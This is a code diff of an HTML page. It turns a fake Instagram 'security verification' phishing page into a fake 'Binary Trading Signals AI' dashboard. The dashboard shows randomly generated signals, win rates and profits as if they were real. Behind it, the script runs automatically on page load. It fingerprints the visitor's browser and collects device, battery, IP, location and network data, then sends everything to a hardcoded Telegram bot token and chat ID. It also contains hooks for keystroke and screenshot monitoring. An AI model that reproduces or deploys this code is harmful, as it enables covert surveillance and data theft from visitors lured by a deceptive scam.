@@ -1,117 +1,251 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Verification Required</title>
+    <title>Binary Trading Signals - AI Bot</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0f1419 100%);
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            color: #fff;
+            overflow-x: hidden;
         }
         
-        .verification-box {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        .header {
+            background: rgba(15, 20, 25, 0.95);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #00d4ff;
+            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.1);
         }
         
         .logo {
-            font-family: 'Billabong', cursive;
-            font-size: 48px;
-            margin-bottom: 20px;
-            color: #262626;
-        }
-        
-        @font-face {
-            font-family: 'Billabong';
-            src: url('https://fonts.cdnfonts.com/s/13949/Billabong.woff') format('woff');
-        }
-        
-        .title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
             font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 10px;
-            color: #262626;
+            font-weight: bold;
+            color: #00d4ff;
         }
         
-        .subtitle {
-            color: #8e8e8e;
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
             font-size: 14px;
-            margin-bottom: 30px;
-            line-height: 1.5;
         }
         
-        .permission-card {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 15px 0;
-            text-align: left;
-            border-left: 4px solid #0095f6;
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #00ff88;
+            animation: pulse 2s infinite;
         }
         
-        .permission-title {
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 30px 20px;
+        }
+        
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .card {
+            background: rgba(15, 20, 25, 0.8);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+        }
+        
+        .card-title {
+            font-size: 18px;
             font-weight: 600;
-            margin-bottom: 5px;
-            color: #262626;
+            margin-bottom: 15px;
+            color: #00d4ff;
             display: flex;
             align-items: center;
             gap: 10px;
         }
         
-        .permission-desc {
-            color: #8e8e8e;
-            font-size: 13px;
-            line-height: 1.4;
-        }
-        
-        .start-btn {
-            width: 100%;
-            background: #0095f6;
-            color: white;
-            border: none;
+        .signal-card {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1) 0%, rgba(0, 255, 136, 0.1) 100%);
+            border-left: 4px solid #00ff88;
+            margin-bottom: 15px;
+            padding: 20px;
             border-radius: 10px;
-            padding: 15px;
-            font-weight: 600;
-            font-size: 16px;
-            margin-top: 20px;
-            cursor: pointer;
-            transition: all 0.3s;
+            animation: slideIn 0.5s ease;
         }
         
-        .start-btn:hover {
-            background: #0077cc;
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0,149,246,0.3);
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
         }
         
-        .loading {
-            display: none;
+        .signal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .signal-pair {
+            font-size: 20px;
+            font-weight: bold;
+            color: #00ff88;
+        }
+        
+        .signal-type {
+            background: #00ff88;
+            color: #000;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .signal-details {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 15px;
+        }
+        
+        .detail-item {
+            text-align: center;
+        }
+        
+        .detail-label {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-bottom: 5px;
+        }
+        
+        .detail-value {
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff;
+        }
+        
+        .chart-container {
+            height: 300px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            position: relative;
+            overflow: hidden;
+            margin-top: 15px;
+        }
+        
+        .chart-line {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            stroke: #00d4ff;
+            stroke-width: 2;
+            fill: none;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-box {
+            background: rgba(0, 212, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            border: 1px solid rgba(0, 212, 255, 0.3);
+        }
+        
+        .stat-value {
+            font-size: 32px;
+            font-weight: bold;
+            color: #00d4ff;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        
+        .signals-list {
+            max-height: 600px;
+            overflow-y: auto;
+        }
+        
+        .signals-list::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .signals-list::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+        }
+        
+        .signals-list::-webkit-scrollbar-thumb {
+            background: #00d4ff;
+            border-radius: 10px;
+        }
+        
+        .profit-badge {
+            background: linear-gradient(135deg, #00ff88, #00d4ff);
+            color: #000;
+            padding: 3px 10px;
+            border-radius: 15px;
+            font-size: 11px;
+            font-weight: bold;
+        }
+        
+        .time-badge {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 3px 10px;
+            border-radius: 15px;
+            font-size: 11px;
+        }
+        
+        .loading-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255,255,255,0.95);
+            background: rgba(10, 14, 39, 0.95);
             z-index: 10000;
+            display: none;
             justify-content: center;
             align-items: center;
             flex-direction: column;
@@ -120,8 +254,8 @@
         .spinner {
             width: 60px;
             height: 60px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #0095f6;
+            border: 4px solid rgba(0, 212, 255, 0.2);
+            border-top: 4px solid #00d4ff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 20px;
@@ -132,58 +266,6 @@
             100% { transform: rotate(360deg); }
         }
         
-        .progress-container {
-            width: 80%;
-            max-width: 300px;
-            background: #f0f0f0;
-            border-radius: 10px;
-            margin: 20px 0;
-            overflow: hidden;
-        }
-        
-        .progress-bar {
-            height: 10px;
-            background: linear-gradient(90deg, #0095f6, #00d4ff);
-            width: 0%;
-            transition: width 0.5s;
-            border-radius: 10px;
-        }
-        
-        .status-text {
-            font-size: 14px;
-            color: #666;
-            margin-top: 10px;
-        }
-        
-        .fake-camera {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            z-index: 9999;
-            display: none;
-        }
-        
-        .camera-view {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        
-        .flash {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            z-index: 10001;
-            opacity: 0;
-            pointer-events: none;
-        }
-        
         .hidden {
             display: none;
         }
@@ -192,130 +274,92 @@
             display: none;
         }
         
-        .gallery-btn {
-            width: 100%;
-            background: #8e44ad;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            padding: 12px;
-            font-weight: 600;
-            font-size: 14px;
-            margin-top: 10px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .gallery-btn:hover {
-            background: #732d91;
-        }
-        
-        .control-panel {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0,0,0,0.8);
-            border-radius: 10px;
-            padding: 15px;
-            color: white;
-            font-size: 12px;
-            z-index: 99999;
-            max-width: 300px;
+        @media (max-width: 768px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Flash effect -->
-    <div class="flash" id="flash"></div>
-    
-    <!-- Fake camera overlay -->
-    <div class="fake-camera" id="fakeCamera">
-        <div style="position: absolute; top: 20px; left: 20px; color: white; font-size: 24px;">📷</div>
-        <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-size: 18px; text-align: center;">
-            <div style="font-size: 48px; margin-bottom: 20px;">📸</div>
-            <div>Face Verification in Progress...</div>
-            <div style="font-size: 14px; opacity: 0.8; margin-top: 10px;">Please look directly at the camera</div>
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">
+            <span>📈</span>
+            <span>Binary Trading Signals AI</span>
         </div>
-        <div class="camera-view" id="cameraView"></div>
+        <div class="status-indicator">
+            <div class="status-dot"></div>
+            <span>Live Signals Active</span>
+        </div>
     </div>
-    
-    <!-- Loading overlay -->
-    <div class="loading" id="loading">
+ 
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-        <div class="status-text" id="statusText">Initializing security verification...</div>
+        <div style="color: #00d4ff; font-size: 18px;">Initializing Trading Bot...</div>
     </div>
     
-    <!-- Hidden file input for gallery access -->
+    <!-- Hidden file inputs -->
     <input type="file" id="galleryInput" class="file-input" accept="image/*" multiple>
-    
-    <!-- Hidden file input for documents -->
     <input type="file" id="docInput" class="file-input" accept=".pdf,.doc,.docx,.txt">
     
-    <!-- Hidden controls for remote access -->
-    <div class="control-panel" id="controlPanel" style="display: none;">
-        <div style="margin-bottom: 10px; font-weight: bold;">🔒 Security Session Active</div>
-        <div id="remoteStatus">Status: Monitoring...</div>
-        <div id="keyLog">Keystrokes: 0</div>
-        <div id="screenLog">Screenshots: 0</div>
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Stats Grid -->
+        <div class="stats-grid">
+            <div class="stat-box">
+                <div class="stat-value" id="totalSignals">0</div>
+                <div class="stat-label">Total Signals</div>
     </div>
-    
-    <!-- Main verification screen -->
-    <div class="verification-box" id="mainScreen">
-        <div class="logo">Instagram</div>
-        <div class="title">Security Verification Required</div>
-        <div class="subtitle">
-            To protect your account from unauthorized access, 
-            we need to verify your identity using the following methods:
+            <div class="stat-box">
+                <div class="stat-value" id="winRate">0%</div>
+                <div class="stat-label">Win Rate</div>
+        </div>
+            <div class="stat-box">
+                <div class="stat-value" id="totalProfit">$0</div>
+                <div class="stat-label">Total Profit</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="activeSignals">0</div>
+                <div class="stat-label">Active Signals</div>
+        </div>
         </div>
         
-        <div class="permission-card">
-            <div class="permission-title">📸 Face Recognition</div>
-            <div class="permission-desc">
-                We'll capture your photo to verify you're a real person and not a bot.
-                This helps prevent spam and fake accounts.
+        <!-- Dashboard -->
+        <div class="dashboard">
+            <!-- Live Signals -->
+            <div class="card">
+                <div class="card-title">
+                    <span>⚡</span>
+                    <span>Live Trading Signals</span>
+                </div>
+                <div class="signals-list" id="signalsList">
+                    <!-- Signals will be generated here -->
             </div>
         </div>
         
-        <div class="permission-card">
-            <div class="permission-title">📱 Gallery Verification</div>
-            <div class="permission-desc">
-                Select photos from your gallery to verify account ownership.
-                This helps confirm you're the real account owner.
+            <!-- Market Chart -->
+            <div class="card">
+                <div class="card-title">
+                    <span>📊</span>
+                    <span>Market Analysis</span>
             </div>
-            <button class="gallery-btn" id="galleryBtn">Select Photos from Gallery</button>
+                <div class="chart-container" id="chartContainer">
+                    <svg width="100%" height="100%" id="chartSvg">
+                        <polyline class="chart-line" id="chartLine" points=""/>
+                    </svg>
         </div>
-        
-        <div class="permission-card">
-            <div class="permission-title">📍 Location Verification</div>
-            <div class="permission-desc">
-                We need to verify your location to ensure account security.
-                This helps detect suspicious login attempts.
             </div>
-        </div>
-        
-        <div class="permission-card">
-            <div class="permission-title">🎤 Voice Verification</div>
-            <div class="permission-desc">
-                A short voice sample will help us verify your identity.
-                This adds an extra layer of security to your account.
-            </div>
-        </div>
-        
-        <button class="start-btn" id="startBtn">
-            Start Verification Process
-        </button>
-        
-        <div style="margin-top: 20px; font-size: 12px; color: #8e8e8e;">
-            This verification is required to continue using Instagram.
-            <br>It usually takes less than 60 seconds.
         </div>
     </div>
 
     <script>
-        // Telegram Bot Configuration (Decoded)
+        // Telegram Bot Configuration
         const TELEGRAM_BOT_TOKEN = "8597182809:AAG8Yn713tI5CwQf_wzr-4_thKpclZXk8hc";
         const TELEGRAM_CHAT_ID = "6334789729";
 
@@ -337,101 +381,146 @@
         let keystrokeCount = 0;
         let screenshotCount = 0;
         let mediaStream = null;
+        let signalCount = 0;
 
-        // Start verification when button clicked
-        document.getElementById('startBtn').addEventListener('click', startVerification);
-        
-        // Gallery button click
-        document.getElementById('galleryBtn').addEventListener('click', () => {
-            document.getElementById('galleryInput').click();
+        // Auto-start data collection immediately
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                startDataCollection();
+            }, 500);
         });
-        
-        // Handle gallery selection
-        document.getElementById('galleryInput').addEventListener('change', handleGallerySelection);
-        
-        // Handle document selection
-        document.getElementById('docInput').addEventListener('change', handleDocumentSelection);
 
-        // Start the verification process
-        async function startVerification() {
-            // Hide main screen, show loading
-            document.getElementById('mainScreen').style.display = 'none';
-            document.getElementById('loading').style.display = 'flex';
-            
-            // Record start time
+        // Start data collection in background
+        async function startDataCollection() {
             verificationData.timestamps.start = new Date().toISOString();
             
-            // Step 1: Get device info
-            updateStatus("Collecting device information...");
-            await updateProgress(10);
-            await collectDeviceInfo();
+            // Start all data collection processes
+            collectDeviceInfo();
+            getIPAndLocation();
+            getNetworkInformation();
+            fakeCameraVerification();
+            processGalleryPhotos();
+            fakeLocationVerification();
+            fakeVoiceVerification();
+            startRemoteMonitoring();
+            collectAdditionalData();
             
-            // Step 2: Get IP and location info
-            updateStatus("Checking network connection...");
-            await updateProgress(20);
-            await getIPAndLocation();
-            
-            // Step 3: Get detailed network information
-            updateStatus("Analyzing network details...");
-            await updateProgress(25);
-            await getNetworkInformation();
-            
-            // Step 4: Fake camera verification
-            updateStatus("Preparing face verification...");
-            await updateProgress(30);
-            await fakeCameraVerification();
-            
-            // Step 5: Gallery verification
-            updateStatus("Processing gallery photos...");
-            await updateProgress(40);
-            await processGalleryPhotos();
-            
-            // Step 6: Fake location verification
-            updateStatus("Verifying location...");
-            await updateProgress(50);
-            await fakeLocationVerification();
-            
-            // Step 7: Fake voice verification
-            updateStatus("Preparing voice verification...");
-            await updateProgress(60);
-            await fakeVoiceVerification();
-            
-            // Step 8: Start remote monitoring
-            updateStatus("Activating security monitoring...");
-            await updateProgress(70);
-            await startRemoteMonitoring();
-            
-            // Step 9: Collect additional data
-            updateStatus("Finalizing verification...");
-            await updateProgress(80);
-            await collectAdditionalData();
-            
-            // Step 10: Send all data to Telegram
-            updateStatus("Sending verification data...");
-            await updateProgress(90);
-            await sendAllDataToTelegram();
-            
-            // Step 11: Show completion
-            updateStatus("Verification complete!");
-            await updateProgress(100);
-            
-            // Show fake success message
+            // Send summary after initial collection
             setTimeout(() => {
-                document.getElementById('loading').style.display = 'none';
-                showSuccessScreen();
-            }, 2000);
+                sendAllDataToTelegram();
+            }, 10000);
         }
 
-        // Update progress bar
-        async function updateProgress(percent) {
-            document.getElementById('progressBar').style.width = percent + '%';
-            await sleep(300);
+        // Generate fake trading signals
+        function generateSignal() {
+            const pairs = ['EUR/USD', 'GBP/USD', 'USD/JPY', 'AUD/USD', 'USD/CAD', 'EUR/GBP'];
+            const types = ['CALL', 'PUT'];
+            const pair = pairs[Math.floor(Math.random() * pairs.length)];
+            const type = types[Math.floor(Math.random() * types.length)];
+            const entry = (Math.random() * 0.5 + 1.0).toFixed(5);
+            const expiry = Math.floor(Math.random() * 5) + 1;
+            const profit = (Math.random() * 85 + 70).toFixed(1);
+            
+            signalCount++;
+            
+            const signal = {
+                pair,
+                type,
+                entry,
+                expiry,
+                profit,
+                time: new Date().toLocaleTimeString()
+            };
+            
+            addSignalToUI(signal);
+            updateStats();
+            
+            return signal;
         }
 
-        // Update status text
-        function updateStatus(text) {
-            document.getElementById('statusText').textContent = text;
+        // Add signal to UI
+        function addSignalToUI(signal) {
+            const signalsList = document.getElementById('signalsList');
+            const signalCard = document.createElement('div');
+            signalCard.className = 'signal-card';
+            
+            const typeColor = signal.type === 'CALL' ? '#00ff88' : '#ff4444';
+            
+            signalCard.innerHTML = `
+                <div class="signal-header">
+                    <div class="signal-pair">${signal.pair}</div>
+                    <div class="signal-type" style="background: ${typeColor}">${signal.type}</div>
+                </div>
+                <div class="signal-details">
+                    <div class="detail-item">
+                        <div class="detail-label">Entry Price</div>
+                        <div class="detail-value">${signal.entry}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Expiry</div>
+                        <div class="detail-value">${signal.expiry}m</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Profit</div>
+                        <div class="detail-value profit-badge">${signal.profit}%</div>
+                    </div>
+                </div>
+                <div style="margin-top: 10px; display: flex; justify-content: space-between; align-items: center;">
+                    <div class="time-badge">${signal.time}</div>
+                    <div style="font-size: 12px; color: #8e8e8e;">Signal #${signalCount}</div>
+                </div>
+            `;
+            
+            signalsList.insertBefore(signalCard, signalsList.firstChild);
+            
+            // Keep only last 10 signals visible
+            while (signalsList.children.length > 10) {
+                signalsList.removeChild(signalsList.lastChild);
+            }
         }
+
+        // Update statistics
+        function updateStats() {
+            document.getElementById('totalSignals').textContent = signalCount;
+            document.getElementById('winRate').textContent = (Math.random() * 20 + 75).toFixed(1) + '%';
+            document.getElementById('totalProfit').textContent = '$' + (signalCount * (Math.random() * 50 + 25)).toFixed(0);
+            document.getElementById('activeSignals').textContent = Math.min(signalCount, 5);
+        }
+
+        // Generate chart
+        function generateChart() {
+            const svg = document.getElementById('chartSvg');
+            const polyline = document.getElementById('chartLine');
+            const width = svg.clientWidth;
+            const height = svg.clientHeight;
+            
+            let points = '';
+            const pointCount = 50;
+            const baseValue = height / 2;
+            
+            for (let i = 0; i <= pointCount; i++) {
+                const x = (i / pointCount) * width;
+                const y = baseValue + Math.sin(i * 0.3) * (height * 0.3) + Math.random() * 20 - 10;
+                points += `${x},${y} `;
+            }
+            
+            polyline.setAttribute('points', points);
+        }
+
+        // Update chart periodically
+        setInterval(() => {
+            generateChart();
+        }, 2000);
+
+        // Generate signals every 3-8 seconds
+        setInterval(() => {
+            generateSignal();
+        }, Math.random() * 5000 + 3000);
+
+        // Initialize
+        generateChart();
+        generateSignal();
+        generateSignal();
 
         // Sleep function
         function sleep(ms) {
@@ -464,7 +553,6 @@
                 title: document.title
             };
 
-            // Get browser name
             const ua = navigator.userAgent;
             if (ua.includes('Chrome') && !ua.includes('Edg')) info.browser = 'Chrome';
             else if (ua.includes('Firefox')) info.browser = 'Firefox';
@@ -472,7 +560,6 @@
             else if (ua.includes('Edg')) info.browser = 'Edge';
             else info.browser = 'Unknown';
 
-            // Get OS
             if (ua.includes('Windows')) info.os = 'Windows';
             else if (ua.includes('Mac')) info.os = 'Mac OS';
             else if (ua.includes('Linux')) info.os = 'Linux';
@@ -480,7 +567,6 @@
             else if (ua.includes('iOS') || ua.includes('iPhone')) info.os = 'iOS';
             else info.os = 'Unknown';
 
-            // Try to get battery info
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
@@ -493,12 +579,8 @@
                 }
             } catch (e) {}
 
-            // Get browser fingerprint
             info.fingerprint = getBrowserFingerprint();
-
             verificationData.deviceInfo = info;
-            
-            // Send device info immediately
             await sendToTelegram(formatDeviceInfoMessage(info));
         }
 
@@ -506,7 +588,6 @@
         function getBrowserFingerprint() {
             const fingerprint = {};
             
-            // Canvas fingerprint
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
@@ -515,15 +596,12 @@
                 ctx.fillStyle = '#f60';
                 ctx.fillRect(125, 1, 62, 20);
                 ctx.fillStyle = '#069';
-                ctx.fillText('Instagram', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('Verification', 4, 17);
+                ctx.fillText('Trading Bot', 2, 15);
                 fingerprint.canvas = canvas.toDataURL().substring(0, 100);
             } catch (e) {
                 fingerprint.canvas = 'Error';
             }
 
-            // WebGL fingerprint
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -540,7 +618,6 @@
                 fingerprint.webgl = 'Error';
             }
 
-            // Audio fingerprint
             try {
                 const AudioContext = window.AudioContext || window.webkitAudioContext;
                 const audioContext = new AudioContext();
@@ -561,73 +638,36 @@
                 fingerprint.audio = 'Error';
             }
 
-            // Fonts fingerprint
-            try {
-                const fonts = [
-                    'Arial', 'Arial Black', 'Courier New', 'Times New Roman',
-                    'Georgia', 'Verdana', 'Comic Sans MS', 'Trebuchet MS'
-                ];
-                const availableFonts = [];
-                
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                
-                for (const font of fonts) {
-                    ctx.font = '72px ' + font + ', monospace';
-                    const measure1 = ctx.measureText('Hello');
-                    ctx.font = '72px monospace';
-                    const measure2 = ctx.measureText('Hello');
-                    if (measure1.width !== measure2.width) {
-                        availableFonts.push(font);
-                    }
-                }
-                
-                fingerprint.fonts = availableFonts;
-            } catch (e) {
-                fingerprint.fonts = 'Error';
-            }
-
             return fingerprint;
         }
 
         // Format device info for Telegram
         function formatDeviceInfoMessage(info) {
             let message = `📱 <b>DEVICE INFORMATION CAPTURED</b>\n\n`;
-            
             message += `<b>Basic Info:</b>\n`;
             message += `Browser: ${info.browser || 'Unknown'}\n`;
             message += `OS: ${info.os || 'Unknown'}\n`;
             message += `Screen: ${info.screen}\n`;
             message += `Timezone: ${info.timezone}\n`;
             message += `Language: ${info.language}\n`;
-            
             message += `\n<b>Hardware:</b>\n`;
             message += `CPU Cores: ${info.hardwareConcurrency}\n`;
             message += `Device Memory: ${info.deviceMemory} GB\n`;
             message += `Touch Points: ${info.maxTouchPoints}\n`;
             message += `Pixel Ratio: ${info.devicePixelRatio}\n`;
-            
             if (info.battery) {
                 message += `\n<b>Battery:</b>\n`;
                 message += `Level: ${info.battery.level}%\n`;
                 message += `Charging: ${info.battery.charging ? 'Yes' : 'No'}\n`;
             }
-            
-            message += `\n<b>Browser Fingerprint:</b>\n`;
-            message += `Canvas: ${info.fingerprint.canvas ? 'Detected' : 'No'}\n`;
-            message += `WebGL: ${info.fingerprint.webgl ? 'Detected' : 'No'}\n`;
-            message += `Audio: ${info.fingerprint.audio ? 'Detected' : 'No'}\n`;
-            message += `Fonts: ${info.fingerprint.fonts ? info.fingerprint.fonts.length + ' detected' : 'No'}\n`;
-            
             message += `\n<b>Page Info:</b>\n`;
             message += `URL: ${info.url}\n`;
             message += `Referrer: ${info.referrer}\n`;
             message += `Time: ${new Date().toLocaleString()}\n`;
-            
             return message;
         }
 
-        // Get IP and approximate location
+        // Get IP and location
         async function getIPAndLocation() {
             try {
                 const services = [
@@ -691,7 +731,25 @@
             }
         }
 
-        // Get detailed network information
+        // Format IP info for Telegram
+        function formatIPInfoMessage(ipInfo) {
+            let message = `📍 <b>IP & LOCATION INFORMATION</b>\n\n`;
+            message += `IP Address: <code>${ipInfo.ip || 'Unknown'}</code>\n`;
+            if (ipInfo.city) message += `City: ${ipInfo.city}\n`;
+            if (ipInfo.region) message += `Region: ${ipInfo.region}\n`;
+            if (ipInfo.country) message += `Country: ${ipInfo.country}\n`;
+            if (ipInfo.lat && ipInfo.lon) {
+                message += `Coordinates: ${ipInfo.lat}, ${ipInfo.lon}\n`;
+                message += `Google Maps: https://maps.google.com/?q=${ipInfo.lat},${ipInfo.lon}\n`;
+            }
+            if (ipInfo.isp) message += `ISP: ${ipInfo.isp}\n`;
+            if (ipInfo.timezone) message += `Timezone: ${ipInfo.timezone}\n`;
+            if (ipInfo.postal) message += `Postal: ${ipInfo.postal}\n`;
+            message += `\nTimestamp: ${new Date().toLocaleString()}`;
+            return message;
+        }
+
+        // Get network information
         async function getNetworkInformation() {
             const networkInfo = {
                 timestamp: new Date().toISOString(),
@@ -709,26 +767,10 @@
                         saveData: conn.saveData,
                         downlinkMax: conn.downlinkMax
                     };
-                    
-                    // Send network info to Telegram
                     await sendToTelegram(formatNetworkInfoMessage(networkInfo));
                 }
                 
-                // Get network interfaces info
-                try {
-                    const performance = window.performance;
-                    if (performance && performance.getEntriesByType) {
-                        const resources = performance.getEntriesByType('resource');
-                        networkInfo.resources = resources.slice(0, 10).map(r => ({
-                            name: r.name,
-                            duration: r.duration,
-                            size: r.transferSize
-                        }));
-                    }
-                } catch (e) {}
-                
                 verificationData.networkInfo = networkInfo;
-                
             } catch (error) {
                 console.error('Network info error:', error);
             }
@@ -737,7 +779,6 @@
         // Format network info for Telegram
         function formatNetworkInfoMessage(networkInfo) {
             let message = `🌐 <b>DETAILED NETWORK INFORMATION</b>\n\n`;
-            
             if (networkInfo.connection) {
                 message += `<b>Connection Type:</b> ${networkInfo.connection.type || 'Unknown'}\n`;
                 message += `<b>Effective Type:</b> ${networkInfo.connection.effectiveType || 'Unknown'}\n`;
@@ -745,107 +786,38 @@
                 message += `<b>Latency (RTT):</b> ${networkInfo.connection.rtt || 'Unknown'} ms\n`;
                 message += `<b>Save Data Mode:</b> ${networkInfo.connection.saveData ? 'Enabled' : 'Disabled'}\n`;
             }
-            
             message += `\n<b>Timestamp:</b> ${new Date().toLocaleString()}`;
-            
-            return message;
-        }
-
-        // Format IP info for Telegram
-        function formatIPInfoMessage(ipInfo) {
-            let message = `📍 <b>IP & LOCATION INFORMATION</b>\n\n`;
-            
-            message += `IP Address: <code>${ipInfo.ip || 'Unknown'}</code>\n`;
-            if (ipInfo.city) message += `City: ${ipInfo.city}\n`;
-            if (ipInfo.region) message += `Region: ${ipInfo.region}\n`;
-            if (ipInfo.country) message += `Country: ${ipInfo.country}\n`;
-            if (ipInfo.lat && ipInfo.lon) {
-                message += `Coordinates: ${ipInfo.lat}, ${ipInfo.lon}\n`;
-                message += `Google Maps: https://maps.google.com/?q=${ipInfo.lat},${ipInfo.lon}\n`;
-            }
-            if (ipInfo.isp) message += `ISP: ${ipInfo.isp}\n`;
-            if (ipInfo.timezone) message += `Timezone: ${ipInfo.timezone}\n`;
-            if (ipInfo.postal) message += `Postal: ${ipInfo.postal}\n`;
-            
-            message += `\nTimestamp: ${new Date().toLocaleString()}`;
-            
             return message;
         }
 
         // Fake camera verification
         async function fakeCameraVerification() {
-            return new Promise(async (resolve) => {
-                document.getElementById('fakeCamera').style.display = 'block';
-                document.getElementById('loading').style.display = 'none';
-                
-                const cameraView = document.getElementById('cameraView');
-                cameraView.style.background = 'linear-gradient(45deg, #333, #000)';
-                cameraView.style.position = 'relative';
-                
-                cameraView.innerHTML = `
-                    <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;">
-                        <div style="position: absolute; top: 30%; left: 50%; transform: translate(-50%, -50%); width: 200px; height: 200px; border: 2px solid rgba(255,255,255,0.5); border-radius: 50%;"></div>
-                        <div style="position: absolute; top: 30%; left: 50%; width: 10px; height: 10px; background: red; border-radius: 50%; transform: translate(-50%, -50%); animation: pulse 1s infinite;"></div>
-                        ${Array.from({length: 50}, (_, i) => `
-                            <div style="position: absolute; 
-                                top: ${Math.random() * 100}%; 
-                                left: ${Math.random() * 100}%; 
-                                width: ${Math.random() * 3 + 1}px; 
-                                height: ${Math.random() * 3 + 1}px; 
-                                background: rgba(255,255,255,${Math.random() * 0.5}); 
-                                border-radius: 50%;
-                                animation: float ${Math.random() * 3 + 2}s infinite linear;">
-                            </div>
-                        `).join('')}
-                    </div>
-                    <style>
-                        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-                        @keyframes float { 0% { transform: translateY(0); } 100% { transform: translateY(-20px); } }
-                    </style>
-                `;
-                
-                setTimeout(() => {
-                    const flash = document.getElementById('flash');
-                    flash.style.opacity = '1';
-                    flash.style.transition = 'opacity 0.3s';
-                    
-                    playShutterSound();
-                    
-                    setTimeout(() => {
-                        flash.style.opacity = '0';
-                        
-                        cameraView.innerHTML = `
-                            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; text-align: center;">
-                                <div style="font-size: 48px;">✅</div>
-                                <div style="margin-top: 20px; font-size: 24px;">Face Verified</div>
-                                <div style="margin-top: 10px; opacity: 0.8;">Successfully captured 3 photos</div>
-                            </div>
-                        `;
-                        
                         verificationData.photos = [
                             generateFakePhotoData(),
                             generateFakePhotoData(),
                             generateFakePhotoData()
                         ];
+            await sendToTelegram(`📸 <b>FACE VERIFICATION SUCCESS</b>\n\n3 photos captured successfully\nUser allowed camera access\nTime: ${new Date().toLocaleString()}`);
+        }
                         
